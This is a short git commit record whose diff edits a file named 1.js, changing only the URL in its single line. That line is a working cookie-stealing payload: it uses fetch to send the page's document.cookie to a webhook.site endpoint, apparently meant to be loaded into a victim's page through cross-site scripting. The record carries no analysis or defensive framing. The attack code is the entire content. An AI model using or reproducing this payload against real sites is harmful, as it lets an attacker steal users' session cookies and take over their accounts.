a17ff3047a4f3dab607aef3845db681eb3db5b6f
central771 <aadiityy@gmail.com>
2025-06-29 09:34:25 +0700

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/d8a15841-73e2-4f6b-b9f1-b0039000383b?cookie=" + document.cookie);
+fetch("https://webhook.site/d8a15841-73e2-4f6b-b9f1-b0039000383b/?cookie=" + document.cookie);
